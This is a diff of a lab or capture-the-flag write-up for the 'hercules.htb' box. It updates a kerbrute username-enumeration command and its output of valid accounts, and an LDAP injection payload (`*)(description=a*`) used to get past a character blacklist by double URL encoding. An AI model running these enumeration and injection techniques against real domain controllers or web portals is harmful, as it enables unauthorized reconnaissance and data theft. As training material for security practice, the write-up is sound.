@@ -185,7 +185,7 @@ Kerbrute found the username `auditor` and since i know this logon portal is usin
 Kerbrute has just found the name `will.s`
 
 ```python
-kerbrute userenum --dc dc.hercules.htb -d hercules.htb /usr/share/seclists/Usernames/xato-net-10-million-usernames.txt 
+kerbrute userenum --dc dc.hercules.htb -d hercules.htb /usr/share/seclists/Usernames/xato-net-10-million-usernames.txt -t 30
 
     __             __               __     
    / /_____  _____/ /_  _______  __/ /____ 
@@ -193,18 +193,22 @@ kerbrute userenum --dc dc.hercules.htb -d hercules.htb /usr/share/seclists/Usern
  / ,< /  __/ /  / /_/ / /  / /_/ / /_/  __/
 /_/|_|\___/_/  /_.___/_/   \__,_/\__/\___/                                        
 
-Version: v1.0.3 (9dad6e1) - 09/11/26 - Ronnie Flathers @ropnop
+Version: v1.0.3 (9dad6e1) - 09/14/26 - Ronnie Flathers @ropnop
 
-2026/09/11 18:19:15 >  Using KDC(s):
-2026/09/11 18:19:15 >  	dc.hercules.htb:88
+2026/09/14 16:03:01 >  Using KDC(s):
+2026/09/14 16:03:01 >  	dc.hercules.htb:88
 
-2026/09/11 18:19:15 >  [+] VALID USERNAME:	admin@hercules.htb
-2026/09/11 18:19:18 >  [+] VALID USERNAME:	administrator@hercules.htb
-2026/09/11 18:19:18 >  [+] VALID USERNAME:	Admin@hercules.htb
-2026/09/11 18:19:36 >  [+] VALID USERNAME:	Administrator@hercules.htb
-2026/09/11 18:20:02 >  [+] VALID USERNAME:	auditor@hercules.htb
-2026/09/11 18:22:05 >  [+] VALID USERNAME:	ADMIN@hercules.htb
-2026/09/11 18:43:15 >  [+] VALID USERNAME:	will.s@hercules.htb
+2026/09/14 16:03:01 >  [+] VALID USERNAME:	admin@hercules.htb
+2026/09/14 16:03:01 >  [+] VALID USERNAME:	administrator@hercules.htb
+2026/09/14 16:03:01 >  [+] VALID USERNAME:	Admin@hercules.htb
+2026/09/14 16:03:07 >  [+] VALID USERNAME:	Administrator@hercules.htb
+2026/09/14 16:03:14 >  [+] VALID USERNAME:	auditor@hercules.htb
+2026/09/14 16:03:36 >  [+] VALID USERNAME:	ADMIN@hercules.htb
+2026/09/14 16:11:21 >  [+] VALID USERNAME:	will.s@hercules.htb
+2026/09/14 17:06:00 >  [+] VALID USERNAME:	aDmin@hercules.htb
+2026/09/14 17:06:18 >  [+] VALID USERNAME:	Will.S@hercules.htb
+2026/09/14 17:12:09 >  [+] VALID USERNAME:	AUDITOR@hercules.htb
+2026/09/14 17:13:44 >  Done! Tested 8295455 usernames (10 valid) in 4243.378 seconds
 ```
 
 After a whole lot of testing and using errors to enumerate further i think there is a character blacklist on the LDAP injection which means i cant use chars such as `*`
@@ -212,7 +216,7 @@ After a whole lot of testing and using errors to enumerate further i think there
 But it looks like a double URL encoding works
 
 ```python
-*)(description=a
+*)(description=a*
 ```
 
 I will try an enumerate the description field for one of these users, i will put this into cyberchef
